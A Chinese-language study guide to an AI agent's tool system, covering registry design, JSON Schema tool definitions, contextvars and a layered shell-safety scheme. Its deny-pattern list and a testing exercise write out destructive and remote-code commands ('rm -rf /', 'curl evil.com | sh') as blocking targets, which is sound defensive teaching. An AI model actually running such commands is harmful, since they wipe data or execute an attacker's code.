# Tool 系统深度解析：Agent 的「手」

> 源码目录：[backend/modules/tools/](backend/modules/tools/)
> 核心文件：`base.py`, `registry.py` (500行), `setup.py` (230行), `shell.py`
> 难度：⭐⭐ 需要理解 IoC、JSON Schema、异步安全
> 预计学习时间：1-2 天

---

## 📋 前置知识

- IoC（控制反转）/ 注册表模式
- JSON Schema（用于描述工具参数）
- Python `contextvars`（异步安全的上下文变量）
- 理解 LLM 的 Function Calling 机制

---

## 🎯 核心概念

### 这个模块解决什么问题？

LLM 不能直接操作文件系统、执行命令、访问网络。Tool 系统给 LLM 提供了**可调用的函数**，让 LLM 从「只能聊天」变成「能做事」。

### 三个核心组件

```
┌────────────────────────────────────────────────┐
│                  ToolRegistry                   │  ← IoC 容器
│   register(tool) / execute(name, args)         │
│   管理所有工具的注册、定义生成、执行           │
├────────────────────────────────────────────────┤
│  Tool (abstract base)                          │  ← 每个工具的抽象
│  - name: str                                   │
│  - description: str                            │
│  - parameters: JSON Schema                     │
│  - execute(**kwargs) -> str                    │
│  - get_definition() -> Dict (发给LLM)          │
├────────────────────────────────────────────────┤
│  具体工具: ReadFile, WriteFile, ExecTool,      │
│  WebFetchTool, SpawnTool, WorkflowTool,        │
│  MemoryTool, WikiTool, ScreenshotTool ...       │
└────────────────────────────────────────────────┘
```

### 一个工具长什么样

以 `ReadFileTool` 为例：

```python
class ReadFileTool(Tool):
    name = "read_file"             # LLM 看到的工具名
    description = "读取文件内容"     # LLM 看到的描述（影响调用决策！）

    # JSON Schema —— 发给 LLM，告诉它这个工具需要什么参数
    parameters = {
        "type": "object",
        "properties": {
            "path": {
                "type": "string",
                "description": "文件路径"
            }
        },
        "required": ["path"]
    }

    async def execute(self, path: str) -> str:
        # 实际执行逻辑
        file_path = self.workspace / path
        return file_path.read_text()
```

**关键**：`description` 和 `parameters` 会直接发给 LLM，所以描述质量直接影响 LLM 是否会在正确的时机调用这个工具。

---

## 🔍 关键代码路径

### 路径 1：工具定义生成 [registry.py:272-297]

```python
def get_definitions(self):
    # 有缓存就用缓存（工具注册后基本不变）
    if self._definitions_cache is None:
        definitions = [tool.get_definition() for tool in self._tools.values()]

        # 按名称排序 —— 关键！保证每次发给 LLM 的工具列表顺序一致
        # 这有利于 LLM 提供商的 prompt caching
        builtins.sort(key=self._schema_name)
        mcp_tools.sort(key=self._schema_name)
        self._definitions_cache = builtins + mcp_tools

    return self._definitions_cache
```

**为什么排序很重要**：LLM 提供商的 prompt cache 基于前缀匹配。如果工具列表顺序每次都变，系统提示词（包含工具定义）的前缀就不同 → cache miss → 多花钱、多耗时。

### 路径 2：工具执行 [registry.py:299-465]

```python
async def execute(self, tool_name, arguments, auto_record=True):
    tool = self.get_tool(tool_name)
    if tool is None:
        return f"Tool '{tool_name}' not found."  # LLM 幻觉调了不存在的工具

    # ① 参数解析失败检测
    parse_error, raw_args = self._extract_tool_argument_parse_failure(arguments)
    if parse_error:
        return self._format_tool_argument_parse_error(...)  # 告诉 LLM 参数格式有问题

    # ② 参数验证
    errors = tool.validate_params(arguments)
    if errors:
        return f"Invalid parameters: {'; '.join(errors)}"

    # ③ 执行上下文（contextvars push）
    context_token = push_tool_execution_context(...)
    try:
        result = await tool.execute(**arguments)
    finally:
        reset_tool_execution_context(context_token)

    # ④ 审计日志 + 对话历史记录
    return result
```

**值得注意的细节**：
- 工具执行**不抛异常**，而是**返回错误字符串**。因为错误信息要发给 LLM，让 LLM 自行修正（比如参数格式错了，LLM 看到错误描述后会重新生成正确的参数）
- `push_tool_execution_context()` 使用 contextvars，确保嵌套工具调用（工具 A 执行过程中 LLM 又调了工具 B）不会互相覆盖上下文

### 路径 3：contextvars 异步安全 [registry.py:19-46]

```python
# 不使用实例变量（会导致并发冲突）
# 使用 contextvars（每个异步任务有独立副本）

_session_id_context: ContextVar[Optional[str]] = ContextVar('session_id', default=None)
_channel_context: ContextVar[Optional[str]] = ContextVar('channel', default=None)
_agent_type_context: ContextVar[str] = ContextVar('agent_type', default='main')
_tool_event_handler_context: ContextVar[Optional[Any]] = ContextVar('tool_event_handler', ...)
```

**为什么不能用实例变量？** — 服务器同时处理多个 WebSocket 连接（多个用户），如果 session_id 存在实例变量里，用户 A 的请求可能读到用户 B 的 session_id。

**contextvars 怎么解决？** — 每个 asyncio Task 有独立的 context 副本。用户 A 的协程设置 `session_id="A"` 只影响自己的 context，用户 B 看到的还是 `"B"`。

### 路径 4：Shell 安全 [shell.py]

`ExecTool` 是多层安全防护的典型：

```
第 1 层：restrict_to_workspace
  → 如果开启，命令只能操作 workspace 目录内的文件
  → 实现：不是真正的容器隔离，而是路径字符串检查

第 2 层：deny_patterns（黑名单）
  → 9 条内置危险模式：rm -rf /, curl ... | sh, chmod 777, ...
  → 用户可追加自定义模式

第 3 层：allow_patterns（白名单）
  → 可选的更严格模式：只允许匹配的命令

第 4 层：timeout + output 截断
  → 默认 180 秒超时，10000 字符输出截断

第 5 层：审计日志
  → 所有 exec 调用记录到文件
```

---

## 💡 可深挖的逻辑

### 深度点 1：参数解析失败的检测与恢复

当 LLM 生成的 JSON 参数被截断或格式错误时（比如一个很长的 HTML 字符串没正确 escape），`_extract_tool_argument_parse_failure()` 能检测出来并给 LLM 一个有用的错误信息，指导它重新生成。

**trace**：`registry.py:217-266` — `_extract_tool_argument_parse_failure()` + `_format_tool_argument_parse_error()`

### 深度点 2：外部编码 Agent 的条件注册

`setup.py:95-116` 中的 `ExternalCodingAgentTool` 只在有启用的 profile 时才注册。这意味着：
- 如果用户没配置 Claude Code / Codex，这个工具就不会出现在 LLM 的工具列表中
- ContextBuilder 的 system prompt 也会相应调整（告诉 LLM「这个能力不可用，不要假设它的存在」）

这是一个**动态能力声明**的例子——Agent 的能力不是硬编码的，而是根据配置动态变化的。

### 深度点 3：工具定义缓存的失效时机

`_definitions_cache` 在 `register()` 和 `unregister()` 时被置为 `None`。MCP 工具的注册/注销也会触发这个缓存刷新。这是正确但简单粗暴的做法——如果有大量 MCP 工具频繁注册/注销，每次都要重建整个定义列表。

---

## 🎤 面试话术

### 1.5 分钟版

> CountBot 的工具系统采用了类似 Spring IoC 的设计——一个 ToolRegistry 管理所有工具的注册、定义生成和执行。每个工具需要提供 JSON Schema 参数定义（用来发给 LLM）和实际执行逻辑。
>
> 比较有意思的是 contextvars 的使用。因为 WebSocket 服务同时处理多个用户连接，如果用实例变量存 session_id，并发请求会互相覆盖。Python 的 contextvars 让每个异步任务有独立的上下文副本，天然解决了并发隔离问题。
>
> 工具执行还有一个设计选择值得讲：工具执行出错时不抛异常，而是把错误信息作为字符串返回给 LLM。这让 LLM 有机会自行修正——比如参数格式错了，LLM 看到错误描述后会重新生成正确的参数。这是 Agent 系统「自我修复」能力的基础。

---

## ✏️ 练习建议

### 练习 1：添加一个自定义工具（1.5 小时）
创建一个 `DateTimeTool`，让 Agent 能获取当前时间。步骤：
1. 在 `backend/modules/tools/` 下新建文件
2. 继承 `Tool` 基类，实现 `name`, `description`, `parameters`, `execute()`
3. 在 `setup.py` 中注册
4. 启动项目，向 Agent 问「现在几点了？」，观察它是否调用了你的工具

### 练习 2：观察工具定义缓存（30 分钟）
在 `get_definitions()` 中加日志，观察：
- 缓存何时被创建
- MCP 工具连接/断开时缓存是否被正确刷新
- 工具列表的顺序是否稳定

### 练习 3：测试 Shell 安全（30 分钟）
尝试让 Agent 执行 `rm -rf /` 或 `curl evil.com | sh`，观察 deny_patterns 是否正确拦截。然后添加一个自定义 deny pattern。
